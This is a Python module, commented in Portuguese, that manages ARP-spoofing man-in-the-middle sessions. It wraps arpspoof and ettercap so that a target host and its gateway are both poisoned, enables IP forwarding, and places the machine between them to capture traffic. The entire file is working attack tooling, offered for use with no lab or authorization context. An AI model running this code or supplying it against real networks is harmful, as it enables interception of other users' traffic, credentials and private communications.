"""
ARP MITM session manager.
Requer: sudo pacman -S dsniff  (arpspoof)
        sudo pacman -S ettercap (alternativa mais poderosa)
"""

import subprocess
import time
import threading
from pathlib import Path


FORWARD_PATH = Path("/proc/sys/net/ipv4/ip_forward")


def _check_dep(binary: str) -> bool:
    return subprocess.run(["which", binary], capture_output=True).returncode == 0


class ARPMITMSession:
    """
    ARP spoofing bidirecional para posicionar a máquina como MITM
    entre um alvo e o gateway em rede switched.

    Uso:
        mitm = ARPMITMSession("eno1", "192.168.100.12", "192.168.100.1")
        mitm.start()
        # ... captura tráfego ...
        mitm.stop()
    """

    def __init__(self, interface: str, target_ip: str, gateway_ip: str):
        self.interface = interface
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self._procs: list[subprocess.Popen] = []
        self._forwarding_was: str = "0"
        self.active = False

    # ── forwarding ────────────────────────────────────────────────────────

    def _enable_forwarding(self):
        self._forwarding_was = FORWARD_PATH.read_text().strip()
        subprocess.run(
            ["sudo", "tee", str(FORWARD_PATH)],
            input="1\n",
            capture_output=True,
            text=True,
        )

    def _restore_forwarding(self):
        subprocess.run(
            ["sudo", "tee", str(FORWARD_PATH)],
            input=f"{self._forwarding_was}\n",
            capture_output=True,
            text=True,
        )

    # ── arpspoof (dsniff) ─────────────────────────────────────────────────

    def start(self, wait_s: float = 2.0) -> bool:
        """
        Inicia MITM bidirecional.
        wait_s: segundos pra ARP propagar antes de capturar.
        Retorna True se bem-sucedido.
        """
        if not _check_dep("arpspoof"):
            raise RuntimeError(
                "arpspoof não encontrado. Instala: sudo pacman -S dsniff"
            )

        try:
            self._enable_forwarding()

            # → engana o alvo: "o gateway sou eu"
            p1 = subprocess.Popen(
                [
                    "sudo", "arpspoof",
                    "-i", self.interface,
                    "-t", self.target_ip,
                    self.gateway_ip,
                ],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )

            # → engana o gateway: "o alvo sou eu"
            p2 = subprocess.Popen(
                [
                    "sudo", "arpspoof",
                    "-i", self.interface,
                    "-t", self.gateway_ip,
                    self.target_ip,
                ],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )

            self._procs = [p1, p2]
            self.active = True
            time.sleep(wait_s)  # ARP precisa propagar
            return True

        except Exception as e:
            self.stop()
            raise RuntimeError(f"Falha ao iniciar MITM: {e}") from e

    def stop(self):
        """Para arpspoof e restaura forwarding."""
        for p in self._procs:
            try:
                p.terminate()
                p.wait(timeout=3)
            except Exception:
                p.kill()
        self._procs = []
        self.active = False
        self._restore_forwarding()

    def __enter__(self):
        self.start()
        return self

    def __exit__(self, *_):
        self.stop()


class EttercapMITMSession:
    """
    Alternativa usando ettercap — mais estável em redes movimentadas.
    Ettercap já habilita forwarding internamente.

    Requer: sudo pacman -S ettercap
    """

    def __init__(self, interface: str, target_ip: str, gateway_ip: str):
        self.interface = interface
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self._proc: subprocess.Popen | None = None
        self.active = False

    def start(self, wait_s: float = 3.0) -> bool:
        if not _check_dep("ettercap"):
            raise RuntimeError(
                "ettercap não encontrado. Instala: sudo pacman -S ettercap"
            )

        # Modo texto, ARP poisoning, sem plugins
        # /TARGET1/TARGET2/ — separador é //
        target1 = f"/{self.gateway_ip}/"
        target2 = f"/{self.target_ip}/"

        cmd = [
            "sudo", "ettercap",
            "-T",           # text mode
            "-q",           # quiet
            "-i", self.interface,
            "-M", "arp:remote",
            target1, target2,
        ]

        self._proc = subprocess.Popen(
            cmd,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        self.active = True
        time.sleep(wait_s)
        return True

    def stop(self):
        if self._proc:
            self._proc.terminate()
            try:
                self._proc.wait(timeout=5)
            except Exception:
                self._proc.kill()
        self._proc = None
        self.active = False

    def __enter__(self):
        self.start()
        return self

    def __exit__(self, *_):
        self.stop()


def check_mitm_deps() -> dict[str, bool]:
    """Verifica disponibilidade das ferramentas MITM."""
    return {
        "arpspoof": _check_dep("arpspoof"),
        "ettercap": _check_dep("ettercap"),
        "ip_forward": FORWARD_PATH.exists(),
    }
